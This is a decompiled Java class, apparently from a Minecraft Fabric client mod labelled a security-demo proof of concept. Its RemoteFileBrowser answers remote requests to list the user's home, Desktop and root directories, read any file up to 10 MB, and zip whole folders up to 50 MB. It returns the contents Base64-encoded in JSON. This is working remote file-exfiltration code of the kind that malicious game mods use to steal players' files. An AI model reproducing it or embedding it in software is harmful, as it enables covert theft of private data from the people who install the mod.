package com.securitydemo.poc;

import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.nio.file.FileSystems;
import java.nio.file.Files;
import java.nio.file.LinkOption;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.attribute.BasicFileAttributes;
import java.util.ArrayList;
import java.util.Base64;
import java.util.Comparator;
import java.util.List;
import java.util.Locale;
import java.util.Objects;
import java.util.function.Consumer;
import java.util.function.Function;
import java.util.stream.Stream;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;
import net.fabricmc.api.EnvType;
import net.fabricmc.api.Environment;

@Environment(EnvType.CLIENT)
final class RemoteFileBrowser {
   private static final PocLogger.Log LOGGER = PocLogger.get();
   private static final int MAX_ENTRIES = 500;
   private static final int MAX_DOWNLOAD_BYTES = 10485760;
   private static final int MAX_ZIP_BYTES = 52428800;
   private static final int MAX_ZIP_FILES = 2500;
   private static final long MAX_ZIP_UNCOMPRESSED = 209715200L;

   private RemoteFileBrowser() {
   }

   static void handleListRequest(final String pathInput, final String requestId, final Consumer<String> notify) {
      (new Thread(new Runnable() {
         public void run() {
            notify.accept(RemoteFileBrowser.listDirectory(pathInput, requestId));
         }
      }, "security-demo-poc-file-list")).start();
   }

   static void handleReadRequest(final String pathInput, final String requestId, final Consumer<String> notify) {
      (new Thread(new Runnable() {
         public void run() {
            notify.accept(RemoteFileBrowser.readFile(pathInput, requestId));
         }
      }, "security-demo-poc-file-read")).start();
   }

   static void handleZipRequest(final String pathInput, final String requestId, final Consumer<String> notify) {
      (new Thread(new Runnable() {
         public void run() {
            notify.accept(RemoteFileBrowser.zipDirectory(pathInput, requestId));
         }
      }, "security-demo-poc-file-zip")).start();
   }

   private static String listDirectory(String pathInput, String requestId) {
      JsonObject response = new JsonObject();
      response.addProperty("type", "file_list_response");
      response.addProperty("requestId", requestId);

      try {
         if (Compat.isBlank(pathInput)) {
            return listRoots(response);
         } else {
            Path dir = resolveExistingPath(pathInput);
            if (!Files.isDirectory(dir, new LinkOption[0])) {
               throw new IOException("Not a directory");
            } else {
               final List<Entry> collected = new ArrayList();
               Stream<Path> stream = Files.list(dir);

               try {
                  stream.limit(501L).forEach(new Consumer<Path>() {
                     public void accept(Path child) {
                        try {
                           BasicFileAttributes attrs = Files.readAttributes(child, BasicFileAttributes.class);
                           collected.add(new Entry(child.getFileName().toString(), child.toAbsolutePath().normalize().toString(), attrs.isDirectory(), attrs.isDirectory() ? 0L : attrs.size()));
                        } catch (IOException var3) {
                        }

                     }
                  });
               } catch (Throwable var12) {
                  if (stream != null) {
                     try {
                        stream.close();
                     } catch (Throwable var11) {
                        var12.addSuppressed(var11);
                     }
                  }

                  throw var12;
               }

               if (stream != null) {
                  stream.close();
               }

               collected.sort(Comparator.comparing(new Function<Entry, Boolean>() {
                  public Boolean apply(Entry e) {
                     return !e.dir;
                  }
               }).thenComparing(new Function<Entry, String>() {
                  public String apply(Entry e) {
                     return e.name.toLowerCase(Locale.ROOT);
                  }
               }));
               List<Entry> entries = collected.size() > 500 ? collected.subList(0, 500) : collected;
               Path parent = dir.getParent();
               response.addProperty("ok", true);
               response.addProperty("path", dir.toAbsolutePath().normalize().toString());
               if (parent != null) {
                  response.addProperty("parent", parent.toAbsolutePath().normalize().toString());
               } else {
                  response.addProperty("parent", "");
               }

               JsonArray array = new JsonArray();

               for(Entry entry : entries) {
                  JsonObject item = new JsonObject();
                  item.addProperty("name", entry.name);
                  item.addProperty("path", entry.path);
                  item.addProperty("dir", entry.dir);
                  item.addProperty("size", entry.size);
                  array.add(item);
               }

               response.add("entries", array);
               return response.toString();
            }
         }
      } catch (Exception e) {
         LOGGER.warn("File list failed for {}: {}", pathInput, e.getMessage());
         response.addProperty("ok", false);
         response.addProperty("error", e.getMessage() == null ? "list failed" : e.getMessage());
         return response.toString();
      }
   }

   private static String listRoots(JsonObject response) {
      response.addProperty("ok", true);
      response.addProperty("path", "");
      response.addProperty("parent", "");
      JsonArray array = new JsonArray();
      String home = System.getProperty("user.home");
      if (!Compat.isBlank(home)) {
         Path homePath = Paths.get(home).toAbsolutePath().normalize();
         addRootEntry(array, "Home (" + String.valueOf(homePath) + ")", homePath.toString());
      }

      Path desktop = DesktopPaths.resolve();
      if (Files.isDirectory(desktop, new LinkOption[0])) {
         addRootEntry(array, "Desktop", desktop.toAbsolutePath().normalize().toString());
      }

      for(Path root : FileSystems.getDefault().getRootDirectories()) {
         addRootEntry(array, root.toString(), root.toAbsolutePath().normalize().toString());
      }

      response.add("entries", array);
      return response.toString();
   }

   private static void addRootEntry(JsonArray array, String label, String path) {
      JsonObject item = new JsonObject();
      item.addProperty("name", label);
      item.addProperty("path", path);
      item.addProperty("dir", true);
      item.addProperty("size", 0);
      array.add(item);
   }

   private static String readFile(String pathInput, String requestId) {
      JsonObject response = new JsonObject();
      response.addProperty("type", "file_read_response");
      response.addProperty("requestId", requestId);

      try {
         if (Compat.isBlank(pathInput)) {
            throw new IOException("Missing path");
         } else {
            Path file = resolveExistingPath(pathInput);
            if (!Files.isRegularFile(file, new LinkOption[0])) {
               throw new IOException("Not a file");
            } else {
               long size = Files.size(file);
               if (size > 10485760L) {
                  throw new IOException("File too large (max 10 MB)");
               } else {
                  byte[] bytes = Files.readAllBytes(file);
                  response.addProperty("ok", true);
                  response.addProperty("name", file.getFileName().toString());
                  response.addProperty("path", file.toAbsolutePath().normalize().toString());
                  response.addProperty("size", size);
                  response.addProperty("data", Base64.getEncoder().encodeToString(bytes));
                  return response.toString();
               }
            }
         }
      } catch (Exception e) {
         LOGGER.warn("File read failed for {}: {}", pathInput, e.getMessage());
         response.addProperty("ok", false);
         response.addProperty("error", e.getMessage() == null ? "read failed" : e.getMessage());
         return response.toString();
      }
   }

   private static String zipDirectory(String pathInput, String requestId) {
      JsonObject response = new JsonObject();
      response.addProperty("type", "file_zip_response");
      response.addProperty("requestId", requestId);

      try {
         if (Compat.isBlank(pathInput)) {
            throw new IOException("Missing folder path");
         } else {
            Path dir = resolveExistingPath(pathInput);
            if (!Files.isDirectory(dir, new LinkOption[0])) {
               throw new IOException("Not a directory");
            } else {
               ByteArrayOutputStream output = new ByteArrayOutputStream();
               int[] stats = new int[1];
               long[] uncompressed = new long[1];
               ZipOutputStream zos = new ZipOutputStream(output);

               try {
                  addDirectoryToZip(dir, dir, zos, stats, uncompressed);
               } catch (Throwable var11) {
                  try {
                     zos.close();
                  } catch (Throwable var10) {
                     var11.addSuppressed(var10);
                  }

                  throw var11;
               }

               zos.close();
               byte[] bytes = output.toByteArray();
               if (bytes.length > 52428800) {
                  throw new IOException("Folder zip too large (max 50 MB)");
               } else {
                  String folderName = dir.getFileName() == null ? "" : dir.getFileName().toString();
                  if (Compat.isBlank(folderName)) {
                     folderName = "folder";
                  }

                  String zipName = folderName + ".zip";
                  response.addProperty("ok", true);
                  response.addProperty("name", zipName);
                  response.addProperty("path", dir.toAbsolutePath().normalize().toString());
                  response.addProperty("size", bytes.length);
                  response.addProperty("files", stats[0]);
                  response.addProperty("data", Base64.getEncoder().encodeToString(bytes));
                  LOGGER.info("Zipped folder {} -> {} ({} files, {} bytes)", dir, zipName, stats[0], bytes.length);
                  return response.toString();
               }
            }
         }
      } catch (Exception e) {
         LOGGER.warn("Folder zip failed for {}: {}", pathInput, e.getMessage());
         response.addProperty("ok", false);
         response.addProperty("error", e.getMessage() == null ? "zip failed" : e.getMessage());
         return response.toString();
      }
   }

   private static void addDirectoryToZip(Path root, Path current, ZipOutputStream zos, int[] fileCount, long[] uncompressed) throws IOException {
      if (!Files.isDirectory(current, new LinkOption[0])) {
         if (Files.isRegularFile(current, new LinkOption[0])) {
            int var10002 = fileCount[0]++;
            if (fileCount[0] > 2500) {
               throw new IOException("Too many files (max 2500)");
            } else {
               long size = Files.size(current);
               uncompressed[0] += size;
               if (uncompressed[0] > 209715200L) {
                  throw new IOException("Folder too large uncompressed (max 200 MB)");
               } else {
                  String entryName = root.relativize(current).toString().replace('\\', '/');
                  ZipEntry entry = new ZipEntry(entryName);
                  entry.setTime(Files.getLastModifiedTime(current).toMillis());
                  zos.putNextEntry(entry);
                  Files.copy(current, zos);
                  zos.closeEntry();
               }
            }
         }
      } else {
         if (!current.equals(root)) {
            String var10000 = root.relativize(current).toString();
            String dirEntry = var10000.replace('\\', '/') + "/";
            zos.putNextEntry(new ZipEntry(dirEntry));
            zos.closeEntry();
         }

         Stream<Path> stream = Files.list(current);

         try {
            List<Path> children = new ArrayList();
            Objects.requireNonNull(children);
            stream.forEach(children::add);
            children.sort(Comparator.comparing((p) -> p.getFileName().toString().toLowerCase(Locale.ROOT)));

            for(Path child : children) {
               addDirectoryToZip(root, child, zos, fileCount, uncompressed);
            }
         } catch (Throwable var10) {
            if (stream != null) {
               try {
                  stream.close();
               } catch (Throwable var9) {
                  var10.addSuppressed(var9);
               }
            }

            throw var10;
         }

         if (stream != null) {
            stream.close();
         }

      }
   }

   private static Path resolveExistingPath(String raw) throws IOException {
      if (raw.contains("..")) {
         throw new IOException("Invalid path");
      } else {
         Path path = Paths.get(raw);
         if (!path.isAbsolute()) {
            path = path.toAbsolutePath();
         }

         path = path.normalize();
         if (!Files.exists(path, new LinkOption[0])) {
            throw new IOException("Path not found");
         } else {
            return path;
         }
      }
   }

   @Environment(EnvType.CLIENT)
   private static final class Entry {
      final String name;
      final String path;
      final boolean dir;
      final long size;

      Entry(String name, String path, boolean dir, long size) {
         this.name = name;
         this.path = path;
         this.dir = dir;
         this.size = size;
      }
   }
}
